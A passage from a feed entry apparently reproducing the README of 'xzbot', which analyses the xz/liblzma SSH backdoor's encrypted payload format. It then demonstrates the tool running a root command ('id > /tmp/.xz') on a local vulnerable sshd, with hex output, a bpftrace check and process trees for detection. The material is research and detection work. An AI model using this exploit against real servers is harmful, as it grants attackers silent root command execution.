(&lt;code&gt;a * b + c&lt;/code&gt;). If this value is greater than 3, the backdoor skips processing.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Type 1: unknown, expects zero bytes&lt;/li&gt; &#xA; &lt;li&gt;Type 2: executes null-terminated payload with system()&lt;/li&gt; &#xA; &lt;li&gt;Type 3: unknown, expects 48 bytes (signed)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;The ciphertext is encrypted with chacha20 using the first 32 bytes of the ED448 public key as a symmetric key. As a result, we can decrypt any exploit attempt using the following key:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;0a 31 fd 3b 2f 1f c6 92 92 68 32 52 c8 c1 ac 28&#xA;34 d1 f2 c9 75 c4 76 5e b1 f6 88 58 88 93 3e 48&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The ciphertext has the following format:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+&#xA;|                    signature (114 bytes)                      |&#xA;+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+&#xA;| x (1 bit) |            unused ? (14 bit)          | y (1 bit) |&#xA;+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+&#xA;|        unknown (8 bit)        |         length (8 bit)        |&#xA;+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+&#xA;|        unknown (8 bit)        |         command \x00          |&#xA;+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Setting either &lt;code&gt;x&lt;/code&gt; or &lt;code&gt;y&lt;/code&gt; leads to slightly different code paths.&lt;/p&gt; &#xA;&lt;p&gt;The signature is an RFC-8032 ED448 signature computed over the following values:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;The 32-bit magic value (e.g. &lt;code&gt;02 00 00 00&lt;/code&gt;)&lt;/li&gt; &#xA; &lt;li&gt;The 5 bytes of fields before command&lt;/li&gt; &#xA; &lt;li&gt;[optional] &lt;code&gt;length&lt;/code&gt; bytes of the command&lt;/li&gt; &#xA; &lt;li&gt;The first 32 bytes of the sha256 hash of the server&#39;s hostkey&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;backdoor demo&lt;/h1&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ go install github.com/amlweems/xzbot@latest&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ xzbot -h&#xA;Usage of xzbot:&#xA;  -addr string&#xA;        ssh server address (default &#34;127.0.0.1:2222&#34;)&#xA;  -seed string&#xA;        ed448 seed, must match xz backdoor key (default &#34;0&#34;)&#xA;  -cmd string&#xA;        command to run via system() (default &#34;id &amp;gt; /tmp/.xz&#34;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The following will connect to a vulnerable SSH server at &lt;code&gt;127.0.0.1:2222&lt;/code&gt; and run the command &lt;code&gt;id &amp;gt; /tmp/.xz&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ xzbot -addr 127.0.0.1:2222 -cmd &#39;id &amp;gt; /tmp/.xz&#39;&#xA;00000000  00 00 00 1c 73 73 68 2d  72 73 61 2d 63 65 72 74  |....ssh-rsa-cert|&#xA;00000010  2d 76 30 31 40 6f 70 65  6e 73 73 68 2e 63 6f 6d  |-v01@openssh.com|&#xA;00000020  00 00 00 00 00 00 00 03  01 00 01 00 00 01 01 01  |................|&#xA;00000030  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|&#xA;...&#xA;00000150  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|&#xA;00000160  00 00 01 14 00 00 00 07  73 73 68 2d 72 73 61 00  |........ssh-rsa.|&#xA;00000170  00 00 01 01 00 00 01 00  02 00 00 00 01 00 00 00  |................|&#xA;00000180  00 00 00 00 00 00 00 00  54 97 bc c5 ef 93 e4 24  |........T......$|&#xA;00000190  cf b1 57 57 59 85 52 fd  41 2a a5 54 9e aa c6 52  |..WWY.R.A*.T...R|&#xA;000001a0  58 64 a4 17 45 8a af 76  ce d2 e3 0b 7c bb 1f 29  |Xd..E..v....|..)|&#xA;000001b0  2b f0 38 45 3f 5e 00 f1  b0 00 15 84 e7 bc 10 1f  |+.8E?^..........|&#xA;000001c0  0f 5f 50 36 07 9f bd 07  05 77 5c 74 84 69 c9 7a  |._P6.....w\t.i.z|&#xA;000001d0  28 6b e8 16 aa 99 34 bf  9d c4 c4 5c b8 fd 4a 3c  |(k....4....\..J&amp;lt;|&#xA;000001e0  d8 2b 39 32 06 d9 4f a4  3a 00 d0 0b 0f a2 21 c0  |.+92..O.:.....!.|&#xA;000001f0  86 c3 c9 e2 e6 17 b4 a6  54 ba c3 a1 4c 40 91 be  |........T...L@..|&#xA;00000200  91 9a 2b f8 0b 18 61 1c  5e e1 e0 5b e8 00 00 00  |..+...a.^..[....|&#xA;00000210  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|&#xA;...&#xA;00000260  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|&#xA;00000270  00 00 00 00 00 00 00 00  00 00 00 10 00 00 00 07  |................|&#xA;00000280  73 73 68 2d 72 73 61 00  00 00 01 00              |ssh-rsa.....|&#xA;2024/03/30 00:00:00 ssh: handshake failed: EOF&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;On the vulnerable server, we can set a watchpoint for the call to &lt;code&gt;system()&lt;/code&gt; and observe the command is executed:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ bpftrace -e &#39;watchpoint:0x07FFFF74B1995:8:x {&#xA;    printf(&#34;%s (%d): %s\n&#34;, comm, pid, str(uptr(reg(&#34;di&#34;))))&#xA;}&#39;&#xA;Attaching 1 probe...&#xA;sshd (1234): id &amp;gt; /tmp/.xz&#xA;&#xA;$ cat /tmp/.xz&#xA;uid=0(root) gid=0(root) groups=0(root)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The process tree after exploitation looks different from a normal sshd process tree:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;# normal process tree&#xA;$ ssh foo@bar&#xA;$ ps -ef --forest&#xA;root         765       1  0 17:58 ?        00:00:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups&#xA;root        1026     765  7 18:51 ?        00:00:00  \_ sshd: foo [priv]&#xA;foo         1050    1026  0 18:51 ?        00:00:00      \_ sshd: foo@pts/1&#xA;foo         1051    1050  0 18:51 pts/1    00:00:00          \_ -bash&#xA;&#xA;# backdoor process tree&#xA;$ xzbot -cmd &#39;sleep 60&#39;&#xA;$ ps -ef --forest&#xA;root         765       1  0 17:58 ?        00:00:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups&#xA;root         941     765  4 18:04 ?        00:00:00  \_ sshd: root [priv]&#xA;sshd         942     941  0 18:04 ?        00:00:00      \_ sshd: root [net]&#xA;root         943     941  0 18:04 ?        00:00:00      \_ sh -c sleep 60&#xA;root         944     943  0 18:04 ?        00:00:00          \_ sleep 60&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;em&gt;Note: successful exploitation does not generate any INFO or higher log entries.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;h1&gt;References&lt;/h1&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.openwall.com/lists/oss-security/2024/03/29/4&#34;&gt;https://www.openwall.com/lists/oss-security/2024/03/29/4&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://gist.github.com/smx-smx/a6112d54777845d389bd7126d6e9f504&#34;&gt;https://gist.github.com/smx-smx/a6112d54777845d389bd7126d6e9f504&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://gist.github.com/q3k/af3d93b6a1f399de28fe194add452d01&#34;&gt;https://gist.github.com/q3k/af3d93b6a1f399de28fe194add452d01&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://gist.github.com/keeganryan/a6c22e1045e67c17e88a606dfdf95ae4&#34;&gt;https://gist.github.com/keeganryan/a6c22e1045e67c17e88a606dfdf95ae4&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
</feed>